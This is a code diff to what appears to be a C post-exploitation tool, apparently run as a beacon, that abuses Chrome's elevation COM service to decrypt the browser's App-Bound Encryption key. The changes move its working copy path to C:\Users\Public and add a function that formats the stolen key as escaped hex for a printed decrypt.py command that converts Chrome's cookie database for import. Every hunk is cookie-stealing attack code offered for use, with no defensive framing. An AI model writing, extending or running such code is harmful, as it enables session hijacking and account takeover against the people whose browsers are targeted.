@@ -13,7 +13,7 @@
 #include <string.h>
 #include <ncrypt.h>
 #define MAX_PATH_LEN 1024
-#define DEFAULT_COPY_PATH "C:\\temp"
+#define DEFAULT_COPY_PATH "C:\\Users\\Public"
 
 
 #define IMPORT_RESOLVE FARPROC SHGetFolderPath = Resolver("shell32", "SHGetFolderPathA"); \
@@ -206,6 +206,16 @@ char* BytesToHexString(const BYTE *byteArray, size_t size) {
     return hexStr;
 }
 
+
+char* BytesToHexStringPythonCommand(const BYTE *byteArray, size_t size) {
+    char *hexStr = (char*)malloc((size * 5) + 1);
+    if (!hexStr) return NULL;
+    for (size_t i = 0; i < size; ++i) {
+        sprintf(hexStr + (i * 5), "\\\\x%02x", byteArray[i]);
+    }
+    return hexStr;
+}
+
 VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, const IID IID_IElevator) {
     // initialize COM
     HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
@@ -296,7 +306,7 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
         DWORD decrypted_size = SysStringByteLen(plaintext_data);
         //printf("Decrypted Data Size: %d\n", decrypted_size);
         printf("[SUCCESS] Decrypted App Bound Key: %s\n", BytesToHexString(plaintext_data, decrypted_size));
-        printf("[SUCCESS] `python3 decrypt.py -k \"%s\" -o cookie-editor -f ChromeCookies.db`\n",BytesToHexString(plaintext_data, decrypted_size));
+        printf("[SUCCESS] `python3 decrypt.py -k \"%s\" -o cookie-editor -f ChromeCookies.db`\n",BytesToHexStringPythonCommand(plaintext_data, decrypted_size));
 
     } else {
         printf("[ERROR] App Bound Key Decryption failed. Last error: %lu\n[ERROR] If error 203, beacon is most likely not operating out of correct file path. \n[ERROR] You must run this out of the web browser's application directory (ie 'C:\\Program Files\\Google\\Chrome\\Application'\n", last_error);
